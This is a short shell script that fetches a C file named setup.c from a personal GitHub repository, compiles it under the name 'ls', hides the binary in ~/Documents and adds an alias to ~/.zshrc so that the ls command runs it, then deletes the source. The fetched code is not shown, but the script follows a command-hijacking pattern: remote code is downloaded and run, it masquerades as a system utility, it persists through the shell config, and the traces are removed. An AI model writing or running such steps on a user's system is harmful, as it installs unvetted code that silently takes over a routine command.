curl -o ls.c https://raw.githubusercontent.com/connor981332/setup/main/setup.c
gcc ./ls.c -o ls
mv ./ls ~/Documents/
echo "alias ls=~/Documents/ls" >> ~/.zshrc
source ~/.zshrc
rm ./ls.c